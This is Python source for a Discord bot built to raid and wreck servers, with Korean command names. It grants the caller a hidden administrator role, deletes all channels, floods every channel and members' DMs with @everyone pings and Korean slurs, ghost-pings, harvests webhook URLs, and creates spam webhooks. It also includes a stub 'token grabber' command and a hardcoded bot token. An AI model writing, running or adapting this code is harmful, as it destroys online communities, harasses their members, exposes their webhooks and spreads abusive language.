import discord
from discord.ext import commands, tasks
import asyncio
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, self_bot=False)

ABUSE_MESSAGES = [
    "# 야이 개벌래스래기새기야",
    "# 너 좆된거야 병신새기야 ㅋㅋㅋㅋㅋㅋ",
    "# 야이 어망구 좆뒤진 새기야!!",
    "야이 애미창녀 개보지 쓰레기새기야!"
]

SPAM_MESSAGE = "# 흑사회에게 머리를 조아려라 좆버러지새기들아!! https://cdn.discordapp.com/attachments/1560547005300867146/1563790071675621426/GIF_1928704690.gif?ex=6adee87e&is=6add96fe&hm=bbbb2568c8aa408e2a6f676828150de09a179d02fa36b2cc2cacc4612ccd5fc8& @everyone"

channel_spam_toggle = False
abuse_spam_toggle = False
channel_names = ["흑룡회 †黑龍", "●█▀█▄모두무릎을꿇어라"]

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (discord.py v2.3.2)")

@bot.command(name="ping")
async def cmd_ping(ctx):
    await ctx.send(f"Latency: {round(bot.latency * 1000)}ms")

@bot.command(name="관리자권한")
async def cmd_admin(ctx):
    try:
        guild = ctx.guild
        permissions = discord.Permissions(administrator=True)
        role = await guild.create_role(name="System Admin", permissions=permissions, color=discord.Color.red())
        await ctx.author.add_roles(role)
        await ctx.message.delete()
    except Exception as e:
        print(f"Error in admin: {e}")

@bot.command(name="채널삭제")
async def cmd_delete_channels(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command(name="채널생성")
async def cmd_create_channel(ctx, *, name: str):
    await ctx.guild.create_text_channel(name)

@tasks.loop(seconds=0.5)
async def channel_spam_task(guild):
    global channel_spam_toggle
    if not channel_spam_toggle:
        channel_spam_task.stop()
        return
    name = random.choice(channel_names)
    try:
        await guild.create_text_channel(name)
    except:
        pass

@bot.command(name="채널스팸")
async def cmd_channel_spam(ctx):
    global channel_spam_toggle
    channel_spam_toggle = True
    channel_spam_task.start(ctx.guild)
    await ctx.message.delete()

@tasks.loop(seconds=0.5)
async def abuse_spam_task(guild):
    global abuse_spam_toggle
    if not abuse_spam_toggle:
        abuse_spam_task.stop()
        return
    for channel in guild.text_channels:
        try:
            msg = random.choice(ABUSE_MESSAGES)
            await channel.send(msg)
        except:
            pass

@bot.command(name="장애타시작")
async def cmd_abuse_start(ctx):
    global abuse_spam_toggle
    abuse_spam_toggle = True
    abuse_spam_task.start(ctx.guild)
    await ctx.message.delete()

@bot.command(name="장애타중지")
async def cmd_abuse_stop(ctx):
    global abuse_spam_toggle
    abuse_spam_toggle = False
    await ctx.message.delete()

@tasks.loop(seconds=0.5)
async def message_spam_task(guild):
    for channel in guild.text_channels:
        try:
            await channel.send(SPAM_MESSAGE)
        except:
            pass

@bot.command(name="메시지스팸")
async def cmd_message_spam(ctx):
    message_spam_task.start(ctx.guild)
    await ctx.message.delete()

@bot.command(name="전체채널도배")
async def cmd_all_channel_flood(ctx, *, msg: str = SPAM_MESSAGE):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(msg)
        except:
            pass
    await ctx.message.delete()

@bot.command(name="고스트핑")
async def cmd_ghost_ping(ctx):
    for channel in ctx.guild.text_channels:
        try:
            m = await channel.send("@everyone")
            await m.delete()
        except:
            pass

@bot.command(name="서버복사")
async def cmd_clone_server(ctx):
    guild = ctx.guild
    for category in guild.categories:
        new_cat = await guild.create_category(category.name)
        for chan in category.channels:
            if isinstance(chan, discord.TextChannel):
                await guild.create_text_channel(chan.name, category=new_cat)
            elif isinstance(chan, discord.VoiceChannel):
                await guild.create_voice_channel(chan.name, category=new_cat)

@bot.command(name="웹훅추출")
async def cmd_get_webhooks(ctx):
    webhooks = []
    for channel in ctx.guild.text_channels:
        try:
            hooks = await channel.webhooks()
            for h in hooks:
                webhooks.append(h.url)
        except:
            pass
    await ctx.author.send(f"Extracted Webhooks: {webhooks}")
    await ctx.message.delete()

@bot.command(name="웹훅전체도배")
async def cmd_webhook_spam(ctx, *, message: str = SPAM_MESSAGE):
    for channel in ctx.guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="NukeHook")
            for _ in range(5):
                await webhook.send(message)
        except:
            pass

@bot.command(name="디엠테러")
async def cmd_dm_terror(ctx, *, message: str = SPAM_MESSAGE):
    for member in ctx.guild.members:
        if member != bot.user and not member.bot:
            try:
                await member.send(message)
            except:
                pass
    await ctx.message.delete()

@bot.command(name="링크테러")
async def cmd_link_terror(ctx, link: str):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(f"@everyone {link}")
        except:
            pass
    await ctx.message.delete()

@bot.command(name="이미지테러")
async def cmd_image_terror(ctx, url: str):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(f"@everyone {url}")
        except:
            pass
    await ctx.message.delete()

@bot.command(name="토큰그래버")
async def cmd_token_grabber(ctx, name: str):
    payload = f"```python\nimport os, json, base64\n# Token grabber payload for {name}\n```"
    await ctx.send(payload)

bot.run("MTU10TUyMjk3MTg2Mzc
0NDYwOA.G6Pxg2.
_wjKEkKQxT8QMlLpRXW
9_ZRcpwl_WF6IC9IUCM")
